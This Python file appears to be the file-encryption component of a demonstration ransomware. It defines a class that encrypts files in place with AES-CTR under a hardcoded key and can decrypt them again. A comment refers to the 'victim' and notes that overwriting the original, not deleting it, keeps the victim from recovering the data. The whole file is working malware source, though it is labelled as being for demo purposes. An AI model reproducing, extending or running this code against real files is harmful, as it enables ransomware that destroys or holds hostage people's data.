from datetime import datetime
import os
import socket
import pyaes


class CryptClass():
    def __init__(self) -> None:
        self.key = "This_key_for_demo_purposes_only!".encode()
        self.aes = pyaes.AESModeOfOperationCTR(self.key)

    def encrypt(self, filename: str) -> None:
        try:
            orig_file = open(filename, "r+b")
            data_file = orig_file.read()
            encrypted_data = self.aes.encrypt(data_file)

            # Overwrite file with encrypted data (if we remove the file, victim can recover it later)
            orig_file.seek(0)
            orig_file.write(encrypted_data)
            orig_file.truncate()
            orig_file.close()
            print(f"[+] File Encrypted: {filename}")
        except:
            print(f"[X] File Not Encrypted: {filename}")

    def decrypt(self, filename: str) -> None:
        try:
            encrypted_file = open(filename, "r+b")
            encrypted_data = encrypted_file.read()
            self.aes = pyaes.AESModeOfOperationCTR(self.key)
            original_data = self.aes.decrypt(encrypted_data)

            encrypted_file.seek(0)
            encrypted_file.write(original_data)
            encrypted_file.truncate()
            encrypted_file.close()
            print(f"[+] File Decrypted: {filename}")
        except:
            print(f"[X] File Not Decrypted: {filename}")
